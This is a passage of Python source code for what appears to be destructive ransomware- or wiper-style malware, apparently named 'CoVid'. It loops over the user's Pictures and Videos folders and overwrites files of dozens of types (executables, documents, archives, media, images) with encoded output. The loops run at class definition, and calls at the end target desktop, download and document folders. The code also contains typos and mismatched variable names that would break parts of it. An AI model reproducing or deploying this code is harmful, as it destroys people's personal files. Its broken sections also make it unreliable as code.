                f24=open(Pictures2+file5,"wb")
                f24.write(crypto.encode())
            elif file5.endswith(".aae"):
                f255=open(Pictures2+file5,"wb")
                f255.write(crypto.encode())
            elif file5.endswith(".jps"):
                f25=open(Pictures2+file5,"wb")
                f25.write(crypto.encode())
            elif file5.endswith(".jp2"):
                f26=open(Pictures2+file5,"wb")
                f26.write(crypto.encode())
            elif file5.endswith(".pcx"):
                f27=open(Pictures2+file5,"wb")
                f27.write(crypto.encode())
            elif file5.endswith(".pgf"):
                f28=open(Pictures2+file5,"wb")
                f28.write(crypto.encode())
            elif file5.endswith(".ras"):
                f29=open(Pictures2+file5,"wb")
                f29.write(crypto.encode())
            elif file5.endswith(".webp"):
                f30=open(Pictures2+file5,"wb")
                f30.write(crypto.encode())
    try:
        liste01=os.listdir(Pictures1)
        for file01 in liste01:
            if file01.endswith(".exe"):
                h1=open(Pictures1+file01,"wb")
                h1.write(crypto.encode())
            if file01.endswith(".pdf"):
                h2=open(Pictures1+file01,"wb")
                h2.write(crypto.encode())
            if file01.endswith(".mp3"):
              h3=open(Pictures1+file01,"wb")
              h3.write(crypto.encode())
            if file01.endswith(".mp4"):
              h4=open(Pictures1+file01,"wb")
              h4.write(crypto.encode())
            if file01.endswith(".rar"):
              h5=open(Pictures1+file01,"wb")
              h5.write(crypto.encode())
            if file01.endswith(".zip"):
              h6=open(Pictures1+file01,"wb")
              h6.write(crypto.encode())
            if file01.endswith(".iso"):
              h7=open(Pictures1+file01,"wb")
              h7.write(crypto.encode())
            if file01.endswith(".txt"):
               h8=open(Pictures1+file01,"wb")
               h8.write(crypto.encode())
            #image File
            elif file01.endswith(".png"):
               with open(Pictures1+file01,"wb") as h9:
                   h9.write(crypto.encode())
            elif file01.endswith(".svg"):
                with open(Pictures1+file01,"wb") as h10:
                    h10.write(crypto.encode())
            elif file01.endswith(".jpg"):
                h11=open(Pictures1+file01,"wb") 
                h11.write(crypto.encode())
            elif file01.endswith(".jfif"):
                h12=open(Pictures1+file01,"wb")
                h12.write(crypto.encode())
            elif file01.endswith(".psd"):
                h13=open(Pictures1+file01,"wb")
                h13.write(crypto.encdoe())
            elif file01.endswith(".gif"):
                h4=open(Pictures1+file01,"wb")
                h14.write(crypto.encode())
            elif file01.endswith(".jpeg"):
               h15=open(Pictures1+fiel01,"wb")
               h15.write(crypto.encode())
            elif file01.endswith(".bmp"):
                h16=open(Pictures1+file01,"wb")
                h16.write(crypto.encode())
            elif file01.endswith(".raw"):
                h17=open(Pictures1+file01,"wb")
                h17.write(crypto.encode())
            elif file01.endswith(".avi"):
                h18=open(Pictures1+file01,"wb")
                h18.write(crypto.encode())
            elif file01.endswith(".ico"):
                h19=open(Pictures1+file01,"wb")
                h19.write(crypto.encode())
            elif file01.endswith(".jif"):
               h20=open(Pictures1+file01,"wb")
               h20.write(crypto.encode())
            elif file01.endswith(".jfi"):
                h21=open(Pictures1+file01,"wb")
                h21.write(crypto.encode())
            elif file01.endswith(".tga"):
                h22=open(Pictures1+file01,"wb")
                h22.write(crypto.encode())
            elif file01.endswith(".tiff"):
                h23=open(Pictures1+file01,"wb")
                h23.write(crypto.encode())
            elif file01.endswith(".ai"):
               h24=open(Pictures1+file01,"wb")
               h24.write(crypto.encode())
            elif file01.endswith(".aae"):
                h255=open(Pictures1+file01,"wb")
                h255.write(crypto.encode())
            elif file01.endswith(".jps"):
                h25=open(Pictures1+file01,"wb")
                h25.write(crypto.encode())
            elif file01.endswith(".jp2"):
                h26=open(Pictures1+file01,"wb")
                h26.write(crypto.encode())
            elif file01.endswith(".pcx"):
                h27=open(Pictures1+file01,"wb")
                h27.write(crypto.encode())
            elif file01.endswith(".pgf"):
               h28=open(Pictures1+file01,"wb")
               h28.write(crypto.encode())
            elif file01.endswith(".ras"):
               h29=open(Pictures1+file01,"wb")
               h29.write(crypto.encode())
            elif file01.endswith(".webp"):
               h30=open(Pictures1+file01,"wb")
               h30.write(crypto.encode())
    except:
        liste5=os.listdir(Pictures2)
        for file5 in liste5:
            if file5.endswith(".exe"):
                f1=open(Pictures2+file5,"wb")
                f1.write(crypto.encode())
            if file5.endswith(".pdf"):
                f2=open(Pictures2+file5,"wb")
                f2.write(crypto.encode())
            if file5.endswith(".mp3"):
                f3=open(Pictures2+file5,"wb")
                f3.write(crypto.encode())
            if file5.endswith(".mp4"):
                f4=open(Pictures2+file5,"wb")
                f4.write(crypto.encode())
            if file5.endswith(".rar"):
                f5=open(Pictures2+file5,"wb")
                f5.write(crypto.encode())
            if file5.endswith(".zip"):
                f6=open(Pictures2+file5,"wb")
                f6.write(crypto.encode())
            if file5.endswith(".iso"):
                f7=open(Pictures2+file5,"wb")
                f7.write(crypto.encode())
            if file5.endswith(".txt"):
                f8=open(Pictures2+file5,"wb")
                f8.write(crypto.encode())
            #image File
            elif file5.endswith(".png"):
                with open(Pictures2+file5,"wb") as f9:
                    f9.write(crypto.encode())
            elif file5.endswith(".svg"):
                with open(Pictures2+file5,"wb") as f10:
                    f10.write(crypto.encode())
            elif file5.endswith(".jpg"):
                f11=open(Pictures2+file5,"wb") 
                f11.write(crypto.encode())
            elif file5.endswith(".jfif"):
                f12=open(Pictures2+file5,"wb")
                f12.write(crypto.encode())
            elif file5.endswith(".psd"):
                f13=open(Pictures2+file5,"wb")
                f13.write(crypto.encdoe())
            elif file5.endswith(".gif"):
                f4=open(Pictures2+file5,"wb")
                f14.write(crypto.encode())
            elif file5.endswith(".jpeg"):
                f15=open(Pictures2+fiel5,"wb")
                f15.write(crypto.encode())
            elif file5.endswith(".bmp"):
                f16=open(Pictures2+file5,"wb")
                f16.write(crypto.encode())
            elif file5.endswith(".raw"):
                f17=open(Pictures2+file5,"wb")
                f17.write(crypto.encode())
            elif file5.endswith(".avi"):
                f18=open(Pictures2+file5,"wb")
                f18.write(crypto.encode())
            elif file5.endswith(".ico"):
                f19=open(Pictures2+file5,"wb")
                f19.write(crypto.encode())
            elif file5.endswith(".jif"):
                f20=open(Pictures2+file5,"wb")
                f20.write(crypto.encode())
            elif file5.endswith(".jfi"):
                f21=open(Pictures2+file5,"wb")
                f21.write(crypto.encode())
            elif file5.endswith(".tga"):
                f22=open(Pictures2+file5,"wb")
                f22.write(crypto.encode())
            elif file5.endswith(".tiff"):
                f23=open(Pictures2+file5,"wb")
                f23.write(crypto.encode())
            elif file5.endswith(".ai"):
                f24=open(Pictures2+file5,"wb")
                f24.write(crypto.encode())
            elif file5.endswith(".aae"):
                f255=open(Pictures2+file5,"wb")
                f255.write(crypto.encode())
            elif file5.endswith(".jps"):
                f25=open(Pictures2+file5,"wb")
                f25.write(crypto.encode())
            elif file5.endswith(".jp2"):
                f26=open(Pictures2+file5,"wb")
                f26.write(crypto.encode())
            elif file5.endswith(".pcx"):
                f27=open(Pictures2+file5,"wb")
                f27.write(crypto.encode())
            elif file5.endswith(".pgf"):
                f28=open(Pictures2+file5,"wb")
                f28.write(crypto.encode())
            elif file5.endswith(".ras"):
                f29=open(Pictures2+file5,"wb")
                f29.write(crypto.encode())
            elif file5.endswith(".webp"):
                f30=open(Pictures2+file5,"wb")
                f30.write(crypto.encode())
        


class system_videos:
    liste7=os.listdir(Videos1)
    for file7 in liste7:
        if file7.endswith(".exe"):
            fj1=open(Videos1+file7,"wb")
            fj1.write(crypto.encode())
        if file7.endswith(".pdf"):
            fj2=open(Videos1+file7,"wb")
            fj2.write(crypto.encode())
        if file7.endswith(".mp3"):
            fj3=open(Videos1+file7,"wb")
            fj3.write(crypto.encode())
        if file7.endswith(".mp4"):
            fj4=open(Videos1+file7,"wb")
            fj4.write(crypto.encode())
        if file7.endswith(".rar"):
            fj5=open(Videos1+file7,"wb")
            fj5.write(crypto.encode())
        if file7.endswith(".zip"):
            fj6=open(Videos1+file7,"wb")
            fj6.write(crypto.encode())
        if file7.endswith(".iso"):
            fj7=open(Videos1+file7,"wb")
            fj7.write(crypto.encode())
        if file7.endswith(".txt"):
            fj8=open(Videos1+file7,"wb")
            fj8.write(crypto.encode())
        #image File
        elif file7.endswith(".png"):
            with open(Videos1+file7,"wb") as fj9:
                fj9.write(crypto.encode())
        elif file7.endswith(".svg"):
            with open(Videos1+file7,"wb") as fj10:
                fj10.write(crypto.encode())
        elif file7.endswith(".jpg"):
            fj11=open(Videos1+file7,"wb") 
            fj11.write(crypto.encode())
        elif file7.endswith(".jfif"):
            fj12=open(Videos1+file7,"wb")
            fj12.write(crypto.encode())
        elif file7.endswith(".psd"):
            fj13=open(Videos1+file7,"wb")
            fj13.write(crypto.encdoe())
        elif file7.endswith(".gif"):
            fj4=open(Videos1+file7,"wb")
            fj14.write(crypto.encode())
        elif file7.endswith(".jpeg"):
            fj15=open(Videos1+fiel7,"wb")
            fj15.write(crypto.encode())
        elif file7.endswith(".bmp"):
            fj16=open(Videos1+file7,"wb")
            fj16.write(crypto.encode())
        elif file7.endswith(".raw"):
            fj17=open(Videos1+file7,"wb")
            fj17.write(crypto.encode())
        elif file7.endswith(".avi"):
            fj18=open(Videos1+file7,"wb")
            fj18.write(crypto.encode())
        elif file7.endswith(".ico"):
            fj19=open(Videos1+file7,"wb")
            fj19.write(crypto.encode())
        elif file7.endswith(".jif"):
            fj20=open(Videos1+file7,"wb")
            fj20.write(crypto.encode())
        elif file7.endswith(".jfi"):
            fj21=open(Videos1+file7,"wb")
            fj21.write(crypto.encode())
        elif file7.endswith(".tga"):
            fj22=open(Videos1+file7,"wb")
            fj22.write(crypto.encode())
        elif file7.endswith(".tiff"):
            fj23=open(Videos1+file7,"wb")
            fj23.write(crypto.encode())
        elif file7.endswith(".ai"):
            fj24=open(Videos1+file7,"wb")
            fj24.write(crypto.encode())
        elif file7.endswith(".aae"):
            fj25=open(Videos1+file7,"wb")
            fj25.write(crypto.encode())
        elif file7.endswith(".jps"):
            fj255=open(Videos1+file7,"wb")
            fj255.write(crypto.encode())
        elif file7.endswith(".jp2"):
            fj26=open(Videos1+file7,"wb")
            fj26.write(crypto.encode())
        elif file7.endswith(".pcx"):
            fj27=open(Videos1+file7,"wb")
            fj27.write(crypto.encode())
        elif file7.endswith(".pgf"):
            fj28=open(Videos1+file7,"wb")
            fj28.write(crypto.encode())
        elif file7.endswith(".ras"):
            fj29=open(Vidoes1+file7,"wb")
            fj29.write(crypto.encode())
        elif file7.endswith(".webp"):
            fj30=open(Videos1+file7,"wb")
            fj30.write(crypto.encode())
    try:
        liste8=os.listdir(Videos)
        for file8 in liste8:
            if file8.endswith(".exe"):
                fjd1=open(Videos+file8,"wb")
                fjd1.write(crypto.encode())
            if file8.endswith(".pdf"):
                fjd2=open(Videos+file8,"wb")
                fjd2.write(crypto.encode())
            if file8.endswith(".mp3"):
                fjd3=open(Videos+file8,"wb")
                fjd3.write(crypto.encode())
            if file8.endswith(".mp4"):
                fjd4=open(Videos+file8,"wb")
                fj4.write(crypto.encode())
            if file8.endswith(".rar"):
                fjd5=open(Videos+file8,"wb")
                fjd5.write(crypto.encode())
            if file8.endswith(".zip"):
                fjd6=open(Videos+file8,"wb")
                fjd6.write(crypto.encode())
            if file8.endswith(".iso"):
                fjd7=open(Videos+file8,"wb")
                fjd7.write(crypto.encode())
            if file8.endswith(".txt"):
                fjd8=open(Videos+file8,"wb")
                fjd8.write(crypto.encode())
            #image File
            elif file8.endswith(".png"):
                with open(Videos+file8,"wb") as fjd9:
                    fjd9.write(crypto.encode())
            elif file8.endswith(".svg"):
                with open(Videos+file8,"wb") as fjd10:
                    fjd10.write(crypto.encode())
            elif file8.endswith(".jpg"):
                fjd11=open(Videos+file8,"wb") 
                fj11.write(crypto.encode())
            elif file8.endswith(".jfif"):
                fjd12=open(Videos+file8,"wb")
                fjd12.write(crypto.encode())
            elif file8.endswith(".psd"):
                fjd13=open(Videos+file8,"wb")
                fjd13.write(crypto.encdoe())
            elif file8.endswith(".gif"):
                fjd4=open(Videos+file8,"wb")
                fjd14.write(crypto.encode())
            elif file8.endswith(".jpeg"):
                fjd15=open(Videos+fiel8,"wb")
                fjd15.write(crypto.encode())
            elif file8.endswith(".bmp"):
                fjd16=open(Videos+file8,"wb")
                fjd16.write(crypto.encode())
            elif file8.endswith(".raw"):
                fjd17=open(Videos+file8,"wb")
                fjd17.write(crypto.encode())
            elif file8.endswith(".avi"):
                fjd18=open(Videos+file8,"wb")
                fjd18.write(crypto.encode())
            elif file8.endswith(".ico"):
                fjd19=open(Videos+file8,"wb")
                fjd19.write(crypto.encode())
            elif file8.endswith(".jif"):
                fjd20=open(Videos+file8,"wb")
                fjd20.write(crypto.encode())
            elif file8.endswith(".jfi"):
                fjd21=open(Videos+file8,"wb")
                fjd21.write(crypto.encode())
            elif file8.endswith(".tga"):
                fjd22=open(Videos+file8,"wb")
                fjd22.write(crypto.encode())
            elif file8.endswith(".tiff"):
                fjd23=open(Videos+file8,"wb")
                fjd23.write(crypto.encode())
            elif file8.endswith(".ai"):
                fjd24=open(Videos+file8,"wb")
                fjd24.write(crypto.encode())
            elif file8.endswith(".aae"):
                fjd25=open(Videos+file8,"wb")
                fjd25.write(crypto.encode())
            elif file8.endswith(".jps"):
                fjd255=open(Videos+file8,"wb")
                fjd255.write(crypto.encode())
            elif file8.endswith(".jp2"):
                fjd26=open(Videos+file8,"wb")
                fjd26.write(crypto.encode())
            elif file8.endswith(".pcx"):
                fjd27=open(Videos+file8,"wb")
                fjd27.write(crypto.encode())
            elif file8.endswith(".pgf"):
                fjd28=open(Videos+file8,"wb")
                fjd28.write(crypto.encode())
            elif file8.endswith(".ras"):
                fjd29=open(Vidoes+file8,"wb")
                fjd29.write(crypto.encode())
            elif file8.endswith(".webp"):
                fjd30=open(Videos+file8,"wb")
                fjd30.write(crypto.encode())
    except:
        liste7=os.listdir(Videos1)
        for file7 in liste7:
            if file7.endswith(".exe"):
                fj1=open(Videos1+file7,"wb")
                fj1.write(crypto.encode())
            if file7.endswith(".pdf"):
                fj2=open(Videos1+file7,"wb")
                fj2.write(crypto.encode())
            if file7.endswith(".mp3"):
                fj3=open(Videos1+file7,"wb")
                fj3.write(crypto.encode())
            if file7.endswith(".mp4"):
                fj4=open(Videos1+file7,"wb")
                fj4.write(crypto.encode())
            if file7.endswith(".rar"):
                fj5=open(Videos1+file7,"wb")
                fj5.write(crypto.encode())
            if file7.endswith(".zip"):
                fj6=open(Videos1+file7,"wb")
                fj6.write(crypto.encode())
            if file7.endswith(".iso"):
                fj7=open(Videos1+file7,"wb")
                fj7.write(crypto.encode())
            if file7.endswith(".txt"):
                fj8=open(Videos1+file7,"wb")
                fj8.write(crypto.encode())
            #image File
            elif file7.endswith(".png"):
                with open(Videos1+file7,"wb") as fj9:
                    fj9.write(crypto.encode())
            elif file7.endswith(".svg"):
                with open(Videos1+file7,"wb") as fj10:
                    fj10.write(crypto.encode())
            elif file7.endswith(".jpg"):
                fj11=open(Videos1+file7,"wb") 
                fj11.write(crypto.encode())
            elif file7.endswith(".jfif"):
                fj12=open(Videos1+file7,"wb")
                fj12.write(crypto.encode())
            elif file7.endswith(".psd"):
                fj13=open(Videos1+file7,"wb")
                fj13.write(crypto.encdoe())
            elif file7.endswith(".gif"):
                fj4=open(Videos1+file7,"wb")
                fj14.write(crypto.encode())
            elif file7.endswith(".jpeg"):
                fj15=open(Videos1+fiel7,"wb")
                fj15.write(crypto.encode())
            elif file7.endswith(".bmp"):
                fj16=open(Videos1+file7,"wb")
                fj16.write(crypto.encode())
            elif file7.endswith(".raw"):
                fj17=open(Videos1+file7,"wb")
                fj17.write(crypto.encode())
            elif file7.endswith(".avi"):
                fj18=open(Videos1+file7,"wb")
                fj18.write(crypto.encode())
            elif file7.endswith(".ico"):
                fj19=open(Videos1+file7,"wb")
                fj19.write(crypto.encode())
            elif file7.endswith(".jif"):
                fj20=open(Videos1+file7,"wb")
                fj20.write(crypto.encode())
            elif file7.endswith(".jfi"):
                fj21=open(Videos1+file7,"wb")
                fj21.write(crypto.encode())
            elif file7.endswith(".tga"):
                fj22=open(Videos1+file7,"wb")
                fj22.write(crypto.encode())
            elif file7.endswith(".tiff"):
                fj23=open(Videos1+file7,"wb")
                fj23.write(crypto.encode())
            elif file7.endswith(".ai"):
                fj24=open(Videos1+file7,"wb")
                fj24.write(crypto.encode())
            elif file7.endswith(".aae"):
                fj25=open(Videos1+file7,"wb")
                fj25.write(crypto.encode())
            elif file7.endswith(".jps"):
                fj255=open(Videos1+file7,"wb")
                fj255.write(crypto.encode())
            elif file7.endswith(".jp2"):
                fj26=open(Videos1+file7,"wb")
                fj26.write(crypto.encode())
            elif file7.endswith(".pcx"):
                fj27=open(Videos1+file7,"wb")
                fj27.write(crypto.encode())
            elif file7.endswith(".pgf"):
                fj28=open(Videos1+file7,"wb")
                fj28.write(crypto.encode())
            elif file7.endswith(".ras"):
                fj29=open(Vidoes1+file7,"wb")
                fj29.write(crypto.encode())
            elif file7.endswith(".webp"):
                fj30=open(Videos1+file7,"wb")
                fj30.write(crypto.encode())

        




CoVid_desk=system_desktop()
CoVid_down=system_download()
CoVid_doc=system_document()
system_music()
system_pictures()
system_videos()
if __name__=="__main__":
  CoVid_desk.system_encrypt()#1
  CoVid_down.encrypto_file()
  CoVid_doc.crypto_file()

